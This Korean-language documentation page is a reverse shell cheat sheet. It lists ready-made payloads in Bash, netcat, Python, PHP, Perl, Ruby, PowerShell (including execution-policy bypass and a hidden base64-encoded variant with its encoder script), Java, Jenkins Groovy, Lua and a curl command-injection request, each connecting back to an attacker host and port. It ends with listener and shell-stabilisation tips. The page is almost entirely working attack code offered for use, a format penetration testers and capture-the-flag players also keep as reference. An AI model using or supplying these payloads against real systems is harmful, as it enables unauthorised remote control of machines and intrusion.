---
sidebar_position: 1
---

# Reverse Shells

다양한 언어로 작성된 Reverse Shell 페이로드입니다.

## Bash

```bash
# 기본
bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1

# -c 옵션
bash -c 'bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1'

# Base64 인코딩
echo -n '/bin/bash -c "/bin/bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1"' | base64
echo '<BASE64>' | base64 -d | bash
```

## Netcat

```bash
# -e 옵션
nc -e /bin/sh <LHOST> <LPORT>
nc -e /bin/bash <LHOST> <LPORT>

# mkfifo
mkfifo /tmp/shell; nc <LHOST> <LPORT> 0</tmp/shell | /bin/sh >/tmp/shell 2>&1; rm /tmp/shell

# nc 없이
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <LHOST> <LPORT> >/tmp/f
```

## Python

```python
# Python 2
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<LHOST>",<LPORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

# Python 3
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<LHOST>",<LPORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

# PTY
python -c 'import pty,subprocess,os,time;(master,slave)=pty.openpty();p=subprocess.Popen(["/bin/su","-c","id","user"],stdin=slave,stdout=slave,stderr=slave);os.read(master,1024);os.write(master,"password\n");time.sleep(0.1);print os.read(master,1024);'

# 파일로 저장
echo 'python3 -c '"'"'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<LHOST>",<LPORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'"'"'' > shell.sh
```

## PHP

```php
# 한 줄
php -r '$sock=fsockopen("<LHOST>",<LPORT>);exec("/bin/sh -i <&3 >&3 2>&3");'

# 파일
<?php
$sock=fsockopen("<LHOST>",<LPORT>);
exec("/bin/sh -i <&3 >&3 2>&3");
?>
```

## Perl

```perl
perl -e 'use Socket;$i="<LHOST>";$p=<LPORT>;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

## Ruby

```ruby
ruby -rsocket -e'f=TCPSocket.open("<LHOST>",<LPORT>).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

## PowerShell

### 기본

```powershell
$client = New-Object System.Net.Sockets.TCPClient('<LHOST>',<LPORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

### 한 줄 (nop)

```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('<LHOST>',<LPORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

### Bypass Execution Policy

```powershell
powershell -nop -exec bypass -c '$client = New-Object System.Net.Sockets.TCPClient("<LHOST>",<LPORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
```

### Base64 인코딩

```python
# revshell_encoder.py
import base64

payload = '$client = New-Object System.Net.Sockets.TCPClient("<LHOST>",<LPORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'

cmd = "powershell -nop -w hidden -e " + base64.b64encode(payload.encode('utf16')[2:]).decode()

print(cmd)
```

사용:
```bash
python3 revshell_encoder.py
powershell -nop -w hidden -e <BASE64>
```

## Java

```java
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/<LHOST>/<LPORT>;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```

## Groovy (Jenkins)

```groovy
String host="<LHOST>";
int port=<LPORT>;
String cmd="/bin/bash";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

## Lua

```lua
http://<RHOST>');os.execute("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <LHOST> <LPORT> >/tmp/f")--
```

## Markdown

```markdown
--';bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1;'--
```

## cURL

```bash
curl --header "Content-Type: application/json" --request POST http://<RHOST>:<RPORT>/upload --data '{"auth": {"name": "<USERNAME>", "password": "<PASSWORD>"}, "filename" : "& echo \"bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1\"|base64 -d|bash"}'
```

## 참고

- Listener: `nc -lvnp <LPORT>`
- 대화형 TTY: `python -c 'import pty;pty.spawn("/bin/bash")'`
- CTRL+Z 후: `stty raw -echo; fg`
- 쉘 안정화: `export TERM=xterm`
- 크기 조정: `stty rows 38 columns 116`
